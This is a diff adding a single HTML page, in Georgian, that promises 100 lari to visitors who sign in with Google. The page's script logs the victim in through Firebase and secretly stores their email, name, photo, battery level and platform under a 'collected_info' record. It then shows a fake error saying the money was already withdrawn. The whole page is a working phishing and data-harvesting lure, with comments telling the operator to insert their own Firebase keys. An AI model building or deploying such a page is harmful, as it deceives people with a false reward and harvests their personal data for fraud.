@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Get 100 GEL</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #121212; color: white; }
+        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; text-align: center; border: 1px solid #333; }
+        button { background: #4285F4; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-size: 16px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>გილოცავთ! 🎉</h2>
+    <p>100 ლარის მისაღებად გაიარეთ ავტორიზაცია Gmail-ით</p>
+    <button onclick="loginAndCollect()">Login with Google</button>
+    <p id="status"></p>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
+
+<script>
+  // შენი Firebase Config აქ ჩასვი
+  const firebaseConfig = {
+    apiKey: "...",
+    authDomain: "...",
+    databaseURL: "...",
+    projectId: "...",
+    storageBucket: "...",
+    messagingSenderId: "...",
+    appId: "..."
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  const auth = firebase.auth();
+  const db = firebase.database();
+
+  async function loginAndCollect() {
+    const provider = new firebase.auth.GoogleAuthProvider();
+    
+    try {
+        const result = await auth.signInWithPopup(provider);
+        const user = result.user;
+        
+        // ბატარეის გაგება
+        let batt = "N/A";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            batt = (b.level * 100).toFixed(0) + "%";
+        }
+
+        // მონაცემების შენახვა შენთან
+        await db.ref('collected_info/' + user.uid).set({
+            email: user.email,
+            displayName: user.displayName,
+            photo: user.photoURL,
+            battery: batt,
+            platform: navigator.platform,
+            lastSeen: new Date().toLocaleString()
+        });
+
+        document.getElementById('status').innerText = "შეცდომა: თანხა უკვე გატანილია სხვა მოწყობილობიდან.";
+    } catch (error) {
+        console.error(error);
+    }
+  }
+</script>
+</body>
+</html>
